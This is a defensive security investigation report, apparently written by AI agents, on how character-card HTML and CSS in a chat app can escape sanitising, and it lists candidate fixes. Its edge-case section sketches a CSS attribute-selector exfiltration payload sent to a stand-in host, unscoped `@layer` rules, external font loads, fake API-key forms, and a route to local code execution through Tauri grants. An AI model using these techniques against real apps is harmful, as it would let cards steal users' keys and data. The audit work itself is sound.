# Chat HTML and CSS security surface: what a card can do, and which levers exist

**STATUS:** investigation only. Nothing is implemented, no plan gate has run, and no Roadmap ticket is open. The candidate items in section 6 are for the maintainer to accept or drop.

**Status:** rev 1, 2026-09-29, at `650dd97f` plus the dirty worktree. Read-only Q&A. One `investigator` (Sonnet 5, about 70k tokens, 26 tool calls) ran first and did not escalate to `deep-investigator`. The Orchestrator then re-read the parser and the Tauri config. This report's author (`doc-writer`) re-opened the cited source for each TRACED claim below. No `doc-verifier` pass has run.

**Maintainer context:**
- `MC-002`: hosted web is the most common platform, then local plain HTTP, then Tauri.
- `MC-011`: the fork has never shipped, so "pre-existing" is not a reason to defer a fix.
- `MC-022`: plugins are widely used and V2 install is discouraged for security reasons.
- Maintainer memory: the hosted build is LAN/VPN private-only with light security by design. Hosted-side items below are framed as integrity and hardening. The Tauri desktop app is a real local-privilege surface.
- Compatibility invariant: upstream character cards (custom CSS, HTML, YouTube iframes) must keep working.

**Confidence labels:** `TRACED` means source was opened and read. `TESTED` means a command was run. `INFERRED` means reasoning or general web-platform knowledge, not checked here. `UNVERIFIED` means not settled.

---

## 1. The question

The maintainer asked four things:
- Is bot-supplied CSS or HTML in chat a security risk on edge cases?
- Is COEP `require-corp` (fear: it breaks YouTube iframes) or `unsafe-none` the right lever?
- How can CSS and chat be made safe while YouTube links keep working?
- What else was missed?

Short answers:
- Yes, there are edge cases. Section 4 lists them.
- COEP is the wrong lever. Leave it unset (section 5).
- The biggest gap is not COEP. Tauri has no CSP and a wide main-window capability set (sections 3.4 and 6, item 1).

## 2. How chat HTML reaches the page (TRACED)

- Chat text is rendered in the main document with `{@html ...}`, not in an iframe: `src/lib/ChatScreens/ChatBody.svelte:277` and `:279` (through `trimMarkdown`), and `src/lib/ChatScreens/BackgroundDom.svelte:18` (a character's `backgroundHTML` plus module background embedding, through `ParseMarkdown`).
- `src/lib/ChatScreens/DefaultChatScreen.svelte:807` renders plugin chat panels with `{@html panel.html}`. `registerChatPanel` in `src/ts/plugins/apiV3/v3.svelte.ts:1210` runs `DOMPurify.sanitize(content)` first. The global DOMPurify hooks in `parser.svelte.ts` apply to that call too, because they are registered on the default instance.
- So card CSS and HTML share the document with the whole app UI. Isolation is entirely the sanitizer's job.

## 3. What already protects (TRACED unless marked)

### 3.1 The HTML sanitizer

`src/ts/parser/parser.svelte.ts`, DOMPurify 3.3.2 (`node_modules/dompurify/package.json`):

- `trimPurifyConfig` (`:808-811`) adds `iframe`, `style`, `risu-style` and some MathML tags. It adds the attributes `allow`, `allowfullscreen`, `frameborder`, `scrolling`, `risu-ctrl`, `risu-btn`, `risu-trigger`, `risu-mark`, `risu-id`, `x-hl-lang` and `x-hl-text`. It does not add `sandbox`.
- `uponSanitizeElement` (`:47-52`) removes any `<iframe>` whose `src` does not start with the literal `https://www.youtube.com/embed/`. A host such as `youtube.com.evil.com` cannot match that prefix. `youtube-nocookie.com` does not match either, so it is rejected today.
- A second `uponSanitizeAttribute` hook (`:114-120`) force-keeps a `blob:` or `asset:` `src` on `IMG`, `SOURCE`, `VIDEO`, `AUDIO` and `STYLE`. That is not a gap.
- The first `uponSanitizeAttribute` hook (`:77-112`):
  - Every `class` value gets an `x-risu-` prefix (values already starting with `hljs` or `x-risu-` are kept).
  - `href` is kept only if it starts with `http://` or `https://`, and `target=_blank` is set. Any other `href` is blanked.
  - With `hideAllImages` on, `<img src>` is rewritten to a placeholder, and `background`/`background-image: url()` is stripped from inline `style` attributes only.
- Scripts and event-handler attributes are not in DOMPurify's defaults. This is DOMPurify's documented default behaviour and was not tested here (INFERRED).

### 3.2 Card `<style>` scoping

- `encodeStyle` (`:962-966`) hex-encodes each `<style>` body into `<risu-style>`. `trimMarkdown` (`:813-856`) sanitizes first, then swaps each surviving `<risu-style>` element for a real `<style>` element through the DOM, so the decoded CSS never goes back through the HTML sanitizer. `</style` inside the CSS is escaped.
- `decodeStyleContent` (`:1009-1033`) decodes the hex, runs `risuChatParser` (CBS) over the text, parses it with `@adobe/css-tools` 4.4.4, and calls `decodeStyleRule` on each top-level rule. A CSS parse error drops the style.
- `decodeStyleRule` (`:968-1001`) does three things:
  - For `rule` nodes, it prefixes each class with `x-risu-` and each selector with `.chattext `.
  - For `media`, `supports`, `document`, `host` and `container`, it recurses into the nested rules.
  - For `import`, it rewrites the target to `data:,` only if the stored value starts with `data:`. In practice this never fires. The parser keeps the `@import` value verbatim (TESTED, scratch `parse`): `@import "data:text/css,a{}";` is stored as `"data:text/css,a{}"` (with quotes) and `@import url(data:text/css,a{});` as `url(data:text/css,a{})`. Neither starts with `data:`. `@import url(//x/a.css);` is stored unchanged too. So no `@import` is rewritten for valid syntax.
- A dropped style leaves nothing, unless the `returnCSSError` setting is on. Then the literal text `CSS ERROR: <error>` replaces it (`:1027-1032`).

### 3.3 Other

- Click-driven card actions go through `handleButtonTriggerWithin` in `src/lib/ChatScreens/Chat.svelte:561` (attached as `onclickcapture` at `:1466`). It finds the nearest `[risu-trigger], [risu-btn]` ancestor of the click target, so it needs a user click. It then calls `runTrigger(..., 'manual', ...)` or `runLuaButtonTrigger`. What those can do is not traced (section 8).

### 3.4 Platform config (the gap)

- `index.html:14` holds only a commented-out CSP meta tag. No live CSP is set there.
- `src-tauri/tauri.conf.json:75` has `"csp": null`. `:51` has `"withGlobalTauri": false`. The one window has no label, so it uses Tauri's default `main` (INFERRED from Tauri's default, not checked). The asset protocol is enabled with scope `$APPDATA` and `/data/**/*` (`:65-74`).
- `server/node/server.cjs` sets no CSP, COOP or COEP response header for the app itself. It serves `dist` through `express.static` (`:15`). Its `setHeader` calls (`:1032`, `:1050`) copy headers in proxy responses. The `content-security-policy` lines at `:614`, `:654`, `:887` and `:955` delete or skip such headers from upstream responses. `vite.config.ts` has no `headers` key. A grep of `server/hono/*.ts` for header code found nothing.
- `src` has no `crossOriginIsolated` or `SharedArrayBuffer` use (grep for both names, no match). Nothing in the app needs cross-origin isolation today.
- `src-tauri/capabilities/migrated.json` applies to window `main` and grants:
  - `core:default`, `fs:default`, `shell:default`, `dialog:default`, `os:default`, `process:default`.
  - `fs:allow-read-file`, `write-file`, `read-dir`, `copy-file`, `mkdir`, `remove`, `rename`, `exists`, with `fs:scope` of `$APPDATA`, `$APPDATA/*`, `$APPDATA/**/*`, `$DOWNLOAD/*`, `/data/**/*` and `$RESOURCE/*`.
  - `http:default` with allow entries `https://*/*`, `https://*/**/*`, `http://*/*`, `http://*/**/*` and `http://*:**`.
  - `shell:allow-spawn` for `node`, `npm`, `npx`, `docker` and `uvx`, each with `"args": true`. Also `shell:allow-open`, `shell:allow-kill` and `shell:allow-stdin-write`.
  - `src-tauri/capabilities/desktop.json` (desktop platforms) adds `updater`, `process`, `shell`, `http` and `deep-link` defaults only. It adds no scope.
- Secrets sit in the in-memory database as plain fields: `openAIKey` (`src/ts/storage/database.svelte.ts:813`), `proxyKey` (`:814`) and `claudeAPIKey` (`:925`), all inside `interface Database` (`:810`).

## 4. Edge cases

### 4.1 Card CSS is not fully scoped (new finding)

`decodeStyleRule` recurses only into `media`, `supports`, `document`, `host` and `container`. `@adobe/css-tools` 4.4.4 also produces `layer` and `starting-style` nodes with nested `rules` (`node_modules/@adobe/css-tools/dist/esm/adobe-css-tools.mjs`, parser and `CssTypes`). `decodeStyleRule` handles neither. Every at-rule that carries nested rules and is not in the recursion list escapes scoping, and the recursion does not reach it even when it sits inside a handled rule.

Test (TESTED, a scratch script calling `parse` from the installed package):
- `@layer a{body{background:red}}` parses to one `layer` node.
- `@starting-style{body{color:red}}` parses to one `starting-style` node.
- `@media x{@layer a{b{c:d}}}` parses to a `media` node whose child is a `layer` node. `decodeStyleRule` recurses into the `media`, then hits the `layer` and stops. So `@layer` nested inside `media`, `supports`, `container`, `document` or `host` escapes too.
- `@layer a{input[value^=sk]{background:url(//x)}}` parses to a `layer` node holding one `rule`. The verifier's verbatim emulation of `decodeStyleRule` (in its scratchpad) and my own parse check agree that this is emitted with no `.chattext ` prefix and no `x-risu-` prefix. The full `trimMarkdown` output was not run, so the end-to-end effect stays untested.

The other at-rules `decodeStyleRule` does not handle are `@font-face`, `@keyframes`, `@page`, `@namespace`, `@charset` and `@custom-media`. They define global names or resources rather than selectors. `@font-face` with `src:url(//x)` passes unchanged (4.2).

Consequences:
- A card can restyle the whole app (`body`, `*`, `#id`, `[attr]`, app class names) from inside `@layer`. That can hide or mimic UI outside the chat text.
- The same route allows CSS attribute-selector exfiltration: a selector such as `input[value^=sk]` with a `url()` background makes the client request a URL that depends on an input's value. Whether a sensitive input exists in the document was not traced (section 8).
- **This contradicts an earlier Orchestrator statement in chat** that scoping defeats CSS attribute-selector exfiltration. Scoping holds only for top-level rules and for rules inside `media`, `supports`, `document`, `host` and `container`.

Other parse outcomes (TESTED, same script):
- `@scope (.a){...}` and CSS nesting (`.a{&:hover{...}}`) throw a parse error, so the whole style is dropped.
- `@property --x{...}` parses as an ordinary `rule` with selector `@property --x`. It is prefixed and is not a live scope leak.

### 4.2 Card CSS can load external resources (TRACED)

- Nothing in `decodeStyleRule` blocks `url()`, external `@import`, `@font-face` sources or `position:fixed`. The `data:` `@import` rewrite never fires for valid syntax (3.2), so no `@import` is rewritten at all. `@font-face{font-family:a;src:url(//x)}` passes through unchanged (TESTED: parses to a `font-face` node that `decodeStyleRule` does not touch).
- `hideAllImages` only rewrites `<img src>` and inline `style` attributes. It does not touch `<style>` blocks (`:80-85`).
- Effect: a card can make the client fetch third-party URLs. That leaks IP address and timing.
- INFERRED, not traced: `risuChatParser` runs on the CSS text before scoping (`:1012`), so a CBS value placed inside `url(...)` would be fetched too. That would let a card send chat-derived text out by image load. Which CBS values are reachable in that position was not traced.

### 4.3 Fake prompts and UI redressing (partly TRACED)

- TRACED: DOMPurify 3.3.2's default tag list includes `form`, `input`, `button`, `select`, `textarea`, `label` and `dialog`. Its default attribute list includes `action`, `method`, `type`, `name`, `value` and `placeholder` (`node_modules/dompurify/dist/purify.cjs.js`, the `html$1` tag list and the attribute list at `:202`). This app's config does not forbid any of them.
- INFERRED: a card can render a fake form, for example "re-enter your API key". With `position:fixed` CSS (allowed, 4.2) it can cover the app. Whether a submit reaches an external host was not tested end to end.
- UNVERIFIED: whether any real sensitive input renders inside `.chattext`, which would make the redressing harder.
- Upstream cards use overlays and styled forms. A blanket rule against them has a compatibility cost.

### 4.4 The Tauri main webview (highest severity, mostly INFERRED)

- TRACED: the capability set in 3.4 is broad and `csp` is `null`.
- INFERRED: Tauri 2's IPC bridge is reachable from page JavaScript even with `withGlobalTauri: false`. If script ever runs in the main webview, it could reach fs writes under the scopes above, unrestricted http, and spawn of `node`, `npm`, `npx`, `docker` and `uvx` with arbitrary args. That is a path to code execution on the user's machine. Not tested.
- Nothing found in this investigation gives a card script execution today. INFERRED: a sanitizer bypass or a plugin bug would put local privilege within reach. A new bypass in DOMPurify or in the hooks above would land here.
- Weight this by `MC-002`: Tauri is the least common platform, but it is the only one where page script can reach the local machine directly.
- Plugins (`MC-022`) are a separate script-execution route. Whether plugin iframes share the main origin was not investigated.

## 5. COEP: leave it unset

- COEP `require-corp` makes a page's cross-origin subresources and iframes require a CORP header or CORS. YouTube embeds do not send that, so they would fail. INFERRED from web-platform behaviour, not tested here.
- COEP `credentialless` keeps cross-origin embeds loading. INFERRED, not tested here.
- The implicit default is `unsafe-none`. Nothing in `src` needs isolation (3.4), so there is no benefit to turning COEP on. It would only add breakage risk for embeds and cards.
- COEP does not limit what sanitized card HTML and CSS can do to the app UI. It is not a defence against 4.1 to 4.4.

## 6. Candidate items (for the maintainer; none accepted)

All are unaccepted. Each would need a plan gate before code. `MC-011` applies: "pre-existing" is not a reason to defer.

1. **Tauri CSP and narrower grants (highest severity).** Set a real CSP in `tauri.conf.json`. Narrow the main-window `http`, `fs` and `shell:allow-spawn` grants, or split what the chat webview can reach from what settings and backup code need. Separate from COEP. Needs a trace of which features truly use each grant.
2. **CSP header on `server/node`** (hosted integrity hardening). Candidate directives: `frame-src` for YouTube (plus `youtube-nocookie.com` if the allowlist is widened, plus plugin origins), `form-action 'self'`, `object-src 'none'`, `base-uri 'none'`. `script-src` needs testing: V2 plugins and WebLLM probably need `unsafe-eval` or `wasm-unsafe-eval` (INFERRED; the commented-out meta in `index.html:14` lists both). `img-src` and `connect-src` cannot realistically be restricted, since cards use arbitrary images and users add arbitrary endpoints.
3. **`sandbox` attribute on the YouTube iframe** as a second layer, and a decision on `youtube-nocookie.com`. A card cannot add `sandbox` itself: it is not in `ADD_ATTR`, and DOMPurify's default attribute list has no `sandbox` (grep of `purify.cjs.js`: no match), so it would be stripped. The app would have to add it after sanitizing. The sandbox tokens YouTube needs were not tested. For comparison, plugin iframes get `allow-scripts`, `allow-modals` and `allow-downloads` (`src/ts/plugins/apiV3/factory.ts:784-786`). A grep of `src` found no `allow-same-origin` outside a comment in `multiTabReload.ts`, so plugin iframes appear to run with an opaque origin. I have not read the rest of `factory.ts`, so that is not confirmed.
4. **Sanitizer: stop fake prompts.** Forbid `form` and `action`, and consider `input`. Consider limiting `position:fixed` and `z-index` in card CSS only if the maintainers accept the cost to upstream cards.
5. **Scope every at-rule that has nested rules in `decodeStyleRule` (raised priority: small fix, closes 4.1).** Recurse into every node that has `.rules`, including `layer` and `starting-style` and any of them nested inside the handled types. Decide separately what to do with `@font-face`, `@keyframes`, `@page`, `@namespace`, `@charset` and `@custom-media`, which are not selectors. The regression test must be written red-first against the current code, for example `@layer a{input[value^=sk]{...}}` and `@media x{@layer a{b{c:d}}}`. Also fix or drop the `data:` `@import` branch, which never fires (3.2).
6. **Decide whether card CSS may load external resources** (`url()`, `@import`, `@font-face`), or gate them the way `hideAllImages` gates images. Includes tracing which CBS values reach the CSS text (4.2).
7. **COEP:** leave unset. Use `credentialless` only if isolation is ever needed. Reject `require-corp`.

## 7. Compatibility notes

- Items 4 to 6 change what cards can render. They need a sample of real upstream cards (custom CSS, overlays, YouTube embeds) as a guard set before landing.
- Item 3 and the YouTube prefix check must not break `https://www.youtube.com/embed/...` embeds. Item 2's `frame-src` must allow that host.
- Item 5 changes how nested at-rules are rewritten. A card using `@layer` or `@starting-style` today would then be scoped to `.chattext` like any other rule.

## 8. What this report does not establish

- What a clicked `risu-trigger` or `risu-btn` can do after `beginWork` in `Chat.svelte`. Not traced.
- Whether other `risu-*` attributes have click handlers elsewhere (`risu-ctrl`, `risu-mark`). Not searched.
- Whether any sensitive input renders inside `.chattext`.
- Whether a fake form's submit reaches an external host. Not tested end to end.
- Which CBS values can reach a `url()` in card CSS (4.2).
- Whether Tauri page JS can reach the IPC bridge and those grants in this build (4.4). Not tested.
- Whether plugin iframes share the main app's origin. Not investigated.
- COEP behaviour with YouTube (section 5). General knowledge, not tested.
- Which `script-src` directives the app needs (item 2). No CSP was tried.
- The full `trimMarkdown` output for an `@layer` card (4.1). Read from source and a parse test only.
- No test was run on Tauri, on the hosted build, or in a browser.
